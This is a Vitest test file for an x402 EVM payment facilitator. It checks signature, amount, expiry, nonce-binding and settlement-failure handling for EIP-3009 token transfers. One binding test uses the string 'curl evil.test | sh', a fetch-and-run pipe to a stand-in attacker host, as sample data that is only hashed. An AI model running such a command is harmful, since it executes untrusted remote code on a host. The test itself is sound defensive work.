import { describe, expect, test } from 'vitest';
import { keccak256, toHex } from 'viem';
import { RHC_MAINNET, micro } from '@bursar/core';
import { deriveNonce, hashRequest, type PaymentBinding } from '../src/binding.js';
import { createExactEvm, type ExactEvmOptions } from '../src/exact-evm.js';
import { SettlementNotSentError } from '../src/errors.js';
import { readMicro } from '../src/payload.js';
import { TRANSFER_WITH_AUTHORIZATION_TYPES } from '../src/eip3009.js';
import type { PaymentPayload, PaymentRequirements } from '../src/types.js';
import {
  USDG_ASSET,
  USDG_NAME,
  NOW,
  PAY_TO,
  PAYER,
  PRICE,
  USDG,
  balanceKey,
  fakeChain,
  fakeSigner,
  type FakeChainState,
} from './support.js';

/** Built from the asset rather than written out, so a payer signs what the verifier checks. */
const DOMAIN = {
  name: USDG_ASSET.name,
  version: USDG_ASSET.version,
  chainId: RHC_MAINNET.chainId,
  verifyingContract: USDG,
} as const;

function requirements(overrides: Record<string, unknown> = {}): PaymentRequirements {
  return {
    scheme: 'exact',
    network: 'eip155:4663',
    amount: '300000',
    asset: USDG,
    payTo: PAY_TO,
    maxTimeoutSeconds: 60,
    ...overrides,
  };
}

type Authorization = {
  from: `0x${string}`;
  to: `0x${string}`;
  value: bigint;
  validAfter: bigint;
  validBefore: bigint;
  nonce: `0x${string}`;
};

async function signed(overrides: Partial<Authorization> = {}): Promise<PaymentPayload> {
  const authorization: Authorization = {
    from: PAYER.address,
    to: PAY_TO,
    value: PRICE,
    validAfter: BigInt(NOW - 60),
    validBefore: BigInt(NOW + 600),
    nonce: keccak256(toHex('mandate-test-nonce')),
    ...overrides,
  };
  const signature = await PAYER.signTypedData({
    domain: DOMAIN,
    types: TRANSFER_WITH_AUTHORIZATION_TYPES,
    primaryType: 'TransferWithAuthorization',
    message: authorization,
  });
  return {
    x402Version: 2,
    accepted: requirements(),
    payload: {
      signature,
      authorization: {
        from: authorization.from,
        to: authorization.to,
        value: authorization.value.toString(),
        validAfter: authorization.validAfter.toString(),
        validBefore: authorization.validBefore.toString(),
        nonce: authorization.nonce,
      },
    },
  };
}

function build(state: FakeChainState = {}, options: Partial<ExactEvmOptions> = {}) {
  const funded: FakeChainState = { balances: balanceKey(PAYER.address, 1_000_000n), ...state };
  const client = fakeChain(funded);
  const signer = fakeSigner();
  const evm = createExactEvm({
    networks: [{ chain: RHC_MAINNET, client, assets: [USDG_ASSET], signer }],
    requireBinding: false,
    ...options,
  });
  return { evm, client, signer };
}

describe('verify', () => {
  test('a well-formed authorisation for the asking price is valid', async () => {
    const { evm } = build();
    const result = await evm.verify(await signed(), requirements(), { now: NOW });
    expect(result).toMatchObject({ isValid: true, payer: PAYER.address, method: 'eip3009' });
    if (result.isValid) expect(result.amount).toBe(PRICE);
  });

  test('an unknown network is refused', async () => {
    const { evm, client } = build();
    const result = await evm.verify(await signed(), requirements({ network: 'eip155:1' }), { now: NOW });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_network' });
    expect(client.reads).toHaveLength(0);
  });

  test('an asset this deployment does not settle is refused', async () => {
    const { evm } = build();
    const other = '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85';
    const result = await evm.verify(await signed(), requirements({ asset: other }), { now: NOW });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_network' });
  });

  test('terms that name another chain than the one being charged are refused', async () => {
    const { evm } = build();
    const payload = await signed();
    const result = await evm.verify(
      { ...payload, accepted: requirements({ network: 'eip155:8453' }) },
      requirements(),
      { now: NOW },
    );
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_network' });
  });

  test('a payment to the wrong recipient names the payer in the refusal', async () => {
    const { evm } = build();
    const result = await evm.verify(
      await signed(),
      requirements({ payTo: '0x000000000000000000000000000000000000dEaD' }),
      { now: NOW },
    );
    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'invalid_exact_evm_payload_recipient_mismatch',
      payer: PAYER.address,
    });
  });

  test('exact means exact, so paying more is refused too', async () => {
    const { evm } = build();
    const result = await evm.verify(await signed({ value: 400_000n }), requirements(), { now: NOW });
    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'invalid_exact_evm_payload_authorization_value_mismatch',
    });
  });

  test('an authorisation that expires mid-settlement is refused up front', async () => {
    const { evm } = build();
    // Valid this instant, reverted by the time it lands.
    const result = await evm.verify(await signed({ validBefore: BigInt(NOW + 3) }), requirements(), {
      now: NOW,
    });
    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'invalid_exact_evm_payload_authorization_valid_before',
    });
  });

  test('an authorisation that outlives the check but not the work is refused', async () => {
    const { evm } = build();
    const payload = await signed({ validBefore: BigInt(NOW + 120) });
    const result = await evm.verify(payload, requirements({ maxTimeoutSeconds: 900 }), { now: NOW });
    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'invalid_exact_evm_payload_authorization_valid_before',
    });
  });

  test('an authorisation that is not yet valid is refused', async () => {
    const { evm } = build();
    const result = await evm.verify(await signed({ validAfter: BigInt(NOW + 300) }), requirements(), {
      now: NOW,
    });
    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'invalid_exact_evm_payload_authorization_valid_after',
    });
  });

  test('a nonce that is not 32 bytes is a malformed payload', async () => {
    const { evm } = build();
    const payload = await signed();
    const broken = {
      ...payload,
      payload: {
        ...payload.payload,
        authorization: { ...(payload.payload?.authorization as object), nonce: '0x1234' },
      },
    };
    const result = await evm.verify(broken, requirements(), { now: NOW });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_payload' });
  });

  test('a missing authorisation is a malformed payload', async () => {
    const { evm } = build();
    const result = await evm.verify(
      { x402Version: 2, payload: { signature: `0x${'ab'.repeat(65)}` } },
      requirements(),
      { now: NOW },
    );
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_payload' });
  });

  test('an unsupported protocol version is refused by name', async () => {
    const { evm } = build();
    const payload = await signed();
    const result = await evm.verify({ ...payload, x402Version: 9 }, requirements(), { now: NOW });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_x402_version' });
  });

  test('a scheme this package does not implement is refused', async () => {
    const { evm } = build();
    const payload = await signed();
    const result = await evm.verify(
      { ...payload, accepted: requirements({ scheme: 'upto' }) },
      requirements(),
      { now: NOW },
    );
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_scheme' });
  });

  test('requirements with no amount are refused as requirements, not as payload', async () => {
    const { evm } = build();
    const bare = requirements();
    delete (bare as Record<string, unknown>)['amount'];
    const result = await evm.verify(await signed(), bare, { now: NOW });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_payment_requirements' });
  });

  test('a signature over another domain does not verify', async () => {
    const { evm } = build();
    const wrong = await PAYER.signTypedData({
      // Base mainnet USDG reports "USD Coin". Signing under the wrong token's name is the mistake
      // this whole module is shaped to prevent.
      domain: { ...DOMAIN, name: 'USD Coin' },
      types: TRANSFER_WITH_AUTHORIZATION_TYPES,
      primaryType: 'TransferWithAuthorization',
      message: {
        from: PAYER.address,
        to: PAY_TO,
        value: PRICE as bigint,
        validAfter: BigInt(NOW - 60),
        validBefore: BigInt(NOW + 600),
        nonce: keccak256(toHex('mandate-test-nonce')),
      },
    });
    const payload = await signed();
    const result = await evm.verify(
      { ...payload, payload: { ...payload.payload, signature: wrong } },
      requirements(),
      { now: NOW },
    );
    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'invalid_exact_evm_payload_signature',
      payer: PAYER.address,
    });
  });

  test('a payer who cannot cover the price is named in the refusal', async () => {
    const { evm } = build({ balances: balanceKey(PAYER.address, 10n) });
    const result = await evm.verify(await signed(), requirements(), { now: NOW });
    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'insufficient_funds',
      payer: PAYER.address,
    });
  });

  test('a spent nonce is a replay, not a malformed payload', async () => {
    const nonce = keccak256(toHex('mandate-test-nonce'));
    const { evm } = build({ spentNonces: [nonce] });
    const result = await evm.verify(await signed(), requirements(), { now: NOW });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_transaction_state' });
  });

  test('an authorisation that would revert is refused before anything is broadcast', async () => {
    const { evm } = build({ simulateError: new Error('execution reverted: FiatTokenV2: invalid signature') });
    const result = await evm.verify(await signed(), requirements(), { now: NOW });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_transaction_state' });
  });
});

describe('binding', () => {
  const binding: PaymentBinding = {
    requestHash: hashRequest(JSON.stringify({ command: 'settle' })),
    salt: `0x${'11'.repeat(32)}`,
  };

  test('an unbound payment is refused when the facilitator requires binding', async () => {
    const { evm } = build({}, { requireBinding: true });
    const result = await evm.verify(await signed(), requirements(), { now: NOW });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'payment_not_bound_to_request' });
  });

  test('a payment bound to another request does not verify against this one', async () => {
    const { evm } = build({}, { requireBinding: true });
    const other = { ...binding, requestHash: hashRequest('curl evil.test | sh') };
    const payload = await signed({ nonce: deriveNonce(other) });
    const result = await evm.verify(payload, requirements(), { now: NOW, binding });
    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'payment_not_bound_to_request',
      payer: PAYER.address,
    });
  });

  test('a payment whose nonce derives from this request verifies', async () => {
    const { evm } = build({}, { requireBinding: true });
    const payload = await signed({ nonce: deriveNonce(binding) });
    const result = await evm.verify(payload, requirements(), { now: NOW, binding });
    expect(result.isValid).toBe(true);
  });
});

describe('settle', () => {
  test('a good payment is broadcast once and reported with its hash', async () => {
    const { evm, signer } = build();
    const result = await evm.settle(await signed(), requirements(), { now: NOW });
    expect(result).toMatchObject({
      success: true,
      settled: true,
      broadcast: true,
      method: 'eip3009',
      network: 'eip155:4663',
      payer: PAYER.address,
    });
    expect(result.transaction).toMatch(/^0x[0-9a-f]{64}$/);
    expect(signer.sent).toHaveLength(1);
    expect(signer.sent[0]?.to).toBe(USDG);
  });

  test('a send that throws is reported as unknown, because an accepted transaction looks the same', async () => {
    const client = fakeChain({ balances: balanceKey(PAYER.address, 1_000_000n) });
    const signer = fakeSigner({ error: new Error('socket hang up') });
    const evm = createExactEvm({
      networks: [{ chain: RHC_MAINNET, client, assets: [USDG_ASSET], signer }],
      requireBinding: false,
    });

    const result = await evm.settle(await signed(), requirements(), { now: NOW });

    // `broadcast: false` would tell a resource server nothing reached the chain, and it acts on
    // that by releasing the replay claim and refunding. A node that accepted the transaction and
    // lost the response throws here too.
    expect(result.success).toBe(false);
    expect(result.settled).toBeNull();
    expect(result.broadcast).toBe(true);
  });

  test('a payment that cannot work is refused without touching the signer', async () => {
    const { evm, signer } = build({ balances: balanceKey(PAYER.address, 1n) });
    const result = await evm.settle(await signed(), requirements(), { now: NOW });
    expect(result).toMatchObject({
      success: false,
      settled: false,
      broadcast: false,
      errorReason: 'insufficient_funds',
    });
    expect(signer.sent).toHaveLength(0);
  });

  test('an unreadable receipt is unconfirmed, not a failure', async () => {
    const { evm } = build({ receipt: new Error('timed out waiting for receipt') });
    const result = await evm.settle(await signed(), requirements(), { now: NOW });
    expect(result).toMatchObject({
      success: false,
      settled: null,
      broadcast: true,
      errorReason: 'settlement_unconfirmed',
    });
    // The answer still carries the hash, which is what makes the transfer findable.
    expect(result.transaction).toMatch(/^0x[0-9a-f]{64}$/);
  });

  test('a reverted transaction moved nothing but still cost gas', async () => {
    const { evm } = build({ receipt: { status: 'reverted', gasUsed: 21_000n } });
    const result = await evm.settle(await signed(), requirements(), { now: NOW });
    expect(result).toMatchObject({
      success: false,
      settled: false,
      broadcast: true,
      errorReason: 'invalid_transaction_state',
    });
  });

  test('the receipt wait is the facilitator\'s own budget, not one the requirements can set', async () => {
    const { evm, client } = build();
    const payload = await signed({ validBefore: BigInt(NOW + 3_600) });

    const result = await evm.settle(payload, requirements({ maxTimeoutSeconds: 3_000 }), { now: NOW });

    expect(result.success).toBe(true);
    // 3,000 seconds as milliseconds is past the point where Node clamps a timer to 1ms, which
    // would answer settlement_unconfirmed for a transfer that was about to confirm.
    expect(client.receiptWaits).toEqual([60_000]);
  });

  test('a deployment with no signer verifies and says so plainly', async () => {
    const client = fakeChain({ balances: balanceKey(PAYER.address, 1_000_000n) });
    const evm = createExactEvm({
      networks: [{ chain: RHC_MAINNET, client, assets: [USDG_ASSET] }],
      requireBinding: false,
    });
    const result = await evm.settle(await signed(), requirements(), { now: NOW });
    expect(result.success).toBe(false);
    expect(result.broadcast).toBe(false);
    expect(result.detail).toContain('does not settle');
  });
});

describe('supported', () => {
  test('both protocol versions, one chain, in CAIP-2 form', () => {
    const { evm } = build();
    const { kinds } = evm.supported();
    expect(kinds).toHaveLength(2);
    expect(kinds.every((kind) => kind.network === 'eip155:4663')).toBe(true);
    expect(kinds.every((kind) => kind.scheme === 'exact')).toBe(true);
    expect(new Set(kinds.map((kind) => kind.x402Version))).toEqual(new Set([1, 2]));
  });

  test('the published asset carries the domain a payer has to sign under', () => {
    const { evm } = build();
    const asset = evm.supported().kinds[0]?.extra.assets[0];
    expect(asset).toMatchObject({ address: USDG, name: USDG_NAME, version: '1', decimals: 6 });
  });

  test('a deployment that opted into nothing advertises EIP-3009 alone', () => {
    const { evm } = build();
    const extra = evm.supported().kinds[0]?.extra;
    expect(extra?.assetTransferMethod).toBe('eip3009');
    expect(extra?.assetTransferMethods).toEqual(['eip3009']);
    expect(extra?.assets[0]?.methods).toEqual(['eip3009']);
  });

  test('the permit paths are advertised once an operator asks for them', () => {
    const evm = createExactEvm({
      networks: [
        {
          chain: RHC_MAINNET,
          client: fakeChain(),
          assets: [USDG_ASSET],
          methods: ['eip3009', 'eip2612', 'permit2'],
        },
      ],
      requireBinding: false,
    });
    const extra = evm.supported().kinds[0]?.extra;
    expect(extra?.assetTransferMethod).toBe('eip3009');
    expect(extra?.assetTransferMethods).toEqual(['eip3009', 'eip2612', 'permit2']);
  });

  test('a deployment that serves one path advertises one path', () => {
    const client = fakeChain();
    const evm = createExactEvm({
      networks: [{ chain: RHC_MAINNET, client, assets: [USDG_ASSET], methods: ['eip3009'] }],
      requireBinding: false,
    });
    const extra = evm.supported().kinds[0]?.extra;
    expect(extra?.assetTransferMethods).toEqual(['eip3009']);
    expect(extra?.assets[0]?.methods).toEqual(['eip3009']);
  });
});

describe('the work budget a resource server quotes', () => {
  test('a fractional budget is a refusal, not an exception out of the verifier', async () => {
    const { evm } = build();
    const result = await evm.verify(await signed(), requirements({ maxTimeoutSeconds: 60.5 }), {
      now: NOW,
    });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_payment_requirements' });
  });

  test('a budget past the ceiling is refused rather than quietly clamped', async () => {
    const { evm } = build();
    for (const maxTimeoutSeconds of [0, -60, 3_601, 1e30, Number.NaN, Number.POSITIVE_INFINITY]) {
      const result = await evm.verify(await signed(), requirements({ maxTimeoutSeconds }), { now: NOW });
      expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_payment_requirements' });
    }
  });

  test('a budget inside the ceiling still decides how long the authorisation must live', async () => {
    const { evm } = build();
    const short = await evm.verify(await signed(), requirements({ maxTimeoutSeconds: 60 }), { now: NOW });
    const long = await evm.verify(await signed(), requirements({ maxTimeoutSeconds: 3_600 }), { now: NOW });

    expect(short.isValid).toBe(true);
    // Signed to NOW + 600, so an hour of work is more than it covers.
    expect(long).toMatchObject({
      isValid: false,
      invalidReason: 'invalid_exact_evm_payload_authorization_valid_before',
    });
  });
});

describe('authorisation fields that do not fit a uint256', () => {
  test('a validBefore past 2^256-1 is an invalid payload, not a 500', async () => {
    const { evm } = build();
    const payload = await signed();
    const scheme = payload.payload as { authorization: Record<string, unknown> };
    const oversized = {
      ...payload,
      payload: {
        ...scheme,
        authorization: { ...scheme.authorization, validBefore: (2n ** 256n).toString() },
      },
    };

    const result = await evm.verify(oversized, requirements(), { now: NOW });

    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_payload' });
  });
});

describe('method selection', () => {
  test('a payload cannot choose a permit path this deployment never opted into', async () => {
    const { evm } = build();
    const payload = await signed();

    const result = await evm.verify(
      { ...payload, payload: { ...payload.payload, method: 'eip2612' } },
      requirements(),
      { now: NOW },
    );

    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'unsupported_asset_transfer_method',
    });
  });

  test('a method the deployment does not serve is refused by name', async () => {
    const client = fakeChain({ balances: balanceKey(PAYER.address, 1_000_000n) });
    const evm = createExactEvm({
      networks: [
        { chain: RHC_MAINNET, client, assets: [USDG_ASSET], signer: fakeSigner(), methods: ['eip3009'] },
      ],
      requireBinding: false,
    });
    const result = await evm.verify(
      await signed(),
      requirements({ extra: { assetTransferMethod: 'permit2' } }),
      { now: NOW },
    );
    expect(result).toMatchObject({
      isValid: false,
      invalidReason: 'unsupported_asset_transfer_method',
    });
  });

  test('amounts arrive as micro-USD, never as a float', async () => {
    const { evm } = build();
    const result = await evm.verify(await signed(), requirements({ amount: 300_000 }), { now: NOW });
    expect(result.isValid).toBe(true);
    if (result.isValid) expect(result.amount).toBe(micro(300_000n));
  });

  test('a fractional price in the requirements is not a price', async () => {
    const { evm } = build();
    const result = await evm.verify(await signed(), requirements({ amount: '0.30' }), { now: NOW });
    expect(result).toMatchObject({ isValid: false, invalidReason: 'invalid_payment_requirements' });
  });
});

describe('failures before anything is sent', () => {
  test('a chain read that throws during the settle re-check is reported as nothing sent', async () => {
    const client = fakeChain({ balances: balanceKey(PAYER.address, 1_000_000n) });
    const signer = fakeSigner();
    const flaky = {
      ...client,
      balanceOf: async (): Promise<bigint> => {
        throw new Error('fetch failed: https://rpc.example/key-in-path');
      },
    };
    const evm = createExactEvm({
      networks: [{ chain: RHC_MAINNET, client: flaky, assets: [USDG_ASSET], signer }],
      requireBinding: false,
    });

    // A throw here reads to the facilitator like a send that may have landed, and it keeps the
    // payer's nonce claimed on the strength of a read that never reached the signer.
    const result = await evm.settle(await signed(), requirements(), { now: NOW });

    expect(result).toMatchObject({
      success: false,
      settled: false,
      broadcast: false,
      errorReason: 'facilitator_unavailable',
    });
    expect(signer.sent).toHaveLength(0);
  });

  test('a signer that says nothing was sent is believed', async () => {
    const client = fakeChain({ balances: balanceKey(PAYER.address, 1_000_000n) });
    const signer = fakeSigner({ error: new SettlementNotSentError('fee estimation failed') });
    const evm = createExactEvm({
      networks: [{ chain: RHC_MAINNET, client, assets: [USDG_ASSET], signer }],
      requireBinding: false,
    });

    const result = await evm.settle(await signed(), requirements(), { now: NOW });

    expect(result).toMatchObject({
      success: false,
      settled: false,
      broadcast: false,
      errorReason: 'facilitator_unavailable',
    });
  });
});

describe('addresses configured in lowercase', () => {
  test('an asset configured in lowercase still settles payments that name it checksummed', async () => {
    const client = fakeChain({ balances: balanceKey(PAYER.address, 1_000_000n) });
    const signer = fakeSigner();
    const lower = { ...USDG_ASSET, address: USDG.toLowerCase() as `0x${string}` };
    const evm = createExactEvm({
      networks: [{ chain: RHC_MAINNET, client, assets: [lower], signer }],
      requireBinding: false,
    });

    const result = await evm.settle(await signed(), requirements(), { now: NOW });

    expect(result).toMatchObject({ success: true, settled: true });
    expect(evm.supported().kinds[0]?.extra?.['assets']).toMatchObject([{ address: USDG }]);
  });
});

describe('readMicro', () => {
  test('an amount past 2^256-1 is not an amount', () => {
    expect(readMicro((2n ** 256n).toString())).toBeNull();
    expect(readMicro(2n ** 256n)).toBeNull();
    expect(readMicro((2n ** 256n - 1n).toString())).toBe(2n ** 256n - 1n);
  });
});
